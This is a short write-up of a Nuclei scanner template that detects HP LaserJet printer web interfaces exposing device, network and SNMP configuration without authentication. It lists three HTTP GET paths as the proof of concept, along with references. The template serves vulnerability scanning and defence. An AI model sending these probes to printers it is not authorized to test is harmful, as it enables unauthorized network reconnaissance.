# Nuclei Template: HP LaserJet Configuration Exposure
**Template ID:** hp-laserjet-config
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-200
**Source:** Nuclei Template (`hp-laserjet-config.yaml`)

## Vulnerability Information & PoC

## Description
HP LaserJet printer web interface exposes sensitive configuration information without authentication.This includes device information, network configuration, SNMP settings, and other sensitive data that could be leveraged for further attacks or network reconnaissance.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/hp/device/this.LCDispatcher?nav=hp.Config
GET {{BaseURL}}/info_configuration.html?tab=Home&menu=DevConfig
GET {{BaseURL}}/SSI/info_configuration.htm
```

## References
- https://support.hp.com/us-en/document/ish_4629476-1206130-16
- https://h10032.www1.hp.com/ctg/Manual/c03137192.pdf
- https://www.exploit-db.com/ghdb/6459
